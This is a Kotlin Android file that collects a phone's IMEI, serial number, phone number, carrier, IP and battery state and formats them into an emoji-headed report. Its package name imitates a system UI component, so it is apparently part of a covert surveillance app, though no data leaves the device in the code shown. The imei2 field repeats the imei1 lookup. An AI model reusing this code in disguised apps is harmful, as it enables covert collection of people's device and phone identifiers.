package com.systemui.package

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import java.net.Inet4Address
import java.net.NetworkInterface

object DeviceInfoCollector {

    @SuppressLint("MissingPermission")
    fun getDeviceInfo(ctx: Context): Map<String, String> {
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        val model = "${Build.MANUFACTURER} ${Build.MODEL}"
        val android = "${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"

        val imei1 = try {
            if (Build.VERSION.SDK_INT >= 26 && Build.VERSION.SDK_INT < 29) {
                tm.imei ?: "None"
            } else if (Build.VERSION.SDK_INT >= 29) {
                "Restricted"
            } else {
                tm.deviceId ?: "None"
            }
        } catch (e: SecurityException) { "Permission denied" }

        val imei2 = try {
            if (Build.VERSION.SDK_INT >= 26 && Build.VERSION.SDK_INT < 29) {
                tm.imei ?: "None"
            } else if (Build.VERSION.SDK_INT >= 29) {
                "Restricted"
            } else {
                "Not supported"
            }
        } catch (e: SecurityException) { "Permission denied" }

        val serial = try {
            if (Build.VERSION.SDK_INT >= 26 && Build.VERSION.SDK_INT < 29) {
                Build.getSerial() ?: "None"
            } else if (Build.VERSION.SDK_INT >= 29) {
                "Restricted"
            } else {
                Build.SERIAL ?: "None"
            }
        } catch (e: SecurityException) { "Permission denied" }

        val battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = try {
            val intent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        } catch (e: Exception) { false }

        val localIp = try {
            val ipInt = wifi.connectionInfo.ipAddress
            if (ipInt != 0) {
                Inet4Address.getByAddress(byteArrayOf(
                    (ipInt and 0xff).toByte(),
                    (ipInt shr 8 and 0xff).toByte(),
                    (ipInt shr 16 and 0xff).toByte(),
                    (ipInt shr 24 and 0xff).toByte()
                )).hostAddress ?: "None"
            } else {
                getLocalIpAddress() ?: "None"
            }
        } catch (e: Exception) { "None" }

        val carrier = try {
            tm.networkOperatorName?.ifEmpty { "None" } ?: "None"
        } catch (e: Exception) { "None" }

        val phoneNumber = try {
            tm.line1Number?.ifEmpty { "None" } ?: "None"
        } catch (e: SecurityException) { "Permission denied" }

        return mapOf(
            "model" to model,
            "android" to android,
            "imei1" to imei1,
            "imei2" to imei2,
            "serial" to serial,
            "battery" to battery.toString(),
            "isCharging" to isCharging.toString(),
            "localIp" to localIp,
            "carrier" to carrier,
            "phoneNumber" to phoneNumber
        )
    }

    private fun getLocalIpAddress(): String? {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()?.flatMap { it.inetAddresses.toList() }?.firstOrNull {
                !it.isLoopbackAddress && it is Inet4Address
            }?.hostAddress
        } catch (e: Exception) { null }
    }

    fun formatDeviceInfo(map: Map<String, String>): String {
        val charging = if (map["isCharging"] == "true") "Charging" else "Not charging"
        
        return buildString {
            appendLine("📱 DEVICE INFO")
            appendLine("━━━━━━━━━━━━━━━━━━━")
            appendLine("Model:    ${map["model"]}")
            appendLine("Android:  ${map["android"]}")
            appendLine("IMEI 1:   ${map["imei1"]}")
            appendLine("IMEI 2:   ${map["imei2"]}")
            appendLine("Serial:   ${map["serial"]}")
            appendLine("Battery:  ${map["battery"]}% ($charging)")
            appendLine()
            appendLine("🌐 NETWORK")
            appendLine("IP:       ${map["localIp"]}")
            appendLine("Carrier:  ${map["carrier"]}")
            appendLine("Number:   ${map["phoneNumber"]}")
        }
    }
}